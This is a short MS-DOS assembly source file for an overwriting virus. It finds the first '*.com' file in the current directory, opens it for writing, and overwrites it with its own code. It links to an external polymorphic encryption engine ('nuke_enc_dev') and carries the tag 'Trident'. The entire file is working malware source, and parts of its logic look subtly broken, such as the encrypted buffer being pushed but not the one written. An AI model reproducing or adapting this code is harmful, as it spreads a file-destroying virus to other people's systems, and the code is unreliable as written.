

.model          tiny
.code
org             100h
extrn		ned_end:abs
extrn		nuke_enc_dev:near

main:
                Mov Ah,4eh
On1:            Lea Dx,FileSpec
                Int 21h

                lea     ax,[bp + ned_end]
		lea	bx,[bp + main]
		mov	cx,0100h
                mov     dx,heap-main
		mov	si,0000000000001111b
		call	nuke_enc_dev
		push	ax

                Mov Ax,3d02h
                Mov Dx,9eh
                Int 21h
                Mov Bh,40h
                Lea Dx,Main
                Xchg Ax,Bx
                Mov Cl,Ah
                Int 21h
                mov ah,4ch
                int 21h

FileSpec        Db '*.com',0
                Db 'Trident'
biggie          Equ $-Main
heap:
end             main

